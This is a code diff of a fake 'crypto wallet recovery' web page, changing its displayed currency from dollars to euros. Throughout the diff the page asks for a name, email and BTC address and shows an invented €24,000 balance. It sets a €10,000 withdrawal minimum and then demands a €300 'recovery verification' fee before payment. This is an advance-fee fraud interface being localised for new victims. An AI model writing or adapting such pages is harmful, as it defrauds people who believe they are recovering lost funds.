@@ -112,7 +112,7 @@
     <div class="wallet-card">
       <h2>Crypto Wallet</h2>
       <p>Wallet ID: 5371 51xx xxxx 3036</p>
-      <div class="balance" id="balance">$0.00</div>
+      <div class="balance" id="balance">€0.00</div>
     </div>
 
     <button class="btn" onclick="startRecovery()">Start Recovery</button>
@@ -145,7 +145,7 @@
     <div class="modal-content">
       <h3>BTC Withdrawal</h3>
       <input type="text" id="withdrawAddress" placeholder="BTC Address" />
-      <input type="number" id="withdrawAmount" placeholder="Amount ($)" />
+      <input type="number" id="withdrawAmount" placeholder="Amount (€)" />
       <button class="btn" onclick="processWithdrawal()">Send</button>
       <div id="stages"></div>
     </div>
@@ -180,7 +180,7 @@
       if (name && email && btc) {
         localStorage.setItem('userName', name);
         greeting.textContent = `Welcome, ${name}!`;
-        balance.textContent = '$50,000.00';
+        balance.textContent = '€24,000.00';
         formModal.style.display = 'none';
 
         sendBtn.disabled = true;
@@ -203,7 +203,7 @@
       const amount = parseFloat(document.getElementById('withdrawAmount').value);
 
       if (!address || isNaN(amount) || amount < 10000) {
-        alert('⚠️ Minimum withdrawal amount is $10,000.');
+        alert('⚠️ Minimum withdrawal amount is €10,000.');
         return;
       }
 
@@ -217,7 +217,7 @@
           if (step === 'Completed') {
             div.classList.add('completed');
             const verify = document.createElement('div');
-            verify.innerHTML = '<p>⚠️ $300 required for full recovery verification to receive payment.</p>';
+            verify.innerHTML = '<p>⚠️ €300 required for full recovery verification to receive payment.</p>';
             stages.appendChild(verify);
           }
           stages.appendChild(div);
@@ -225,12 +225,11 @@
       });
     }
 
-        // Greet returning user
     window.onload = () => {
       const name = localStorage.getItem('userName');
       if (name) {
         greeting.textContent = `Welcome, ${name}!`;
-        balance.textContent = '$50,000.00';
+        balance.textContent = '€24,000.00';
         sendBtn.disabled = true;
         transferBtn.disabled = true;
         billBtn.disabled = true;
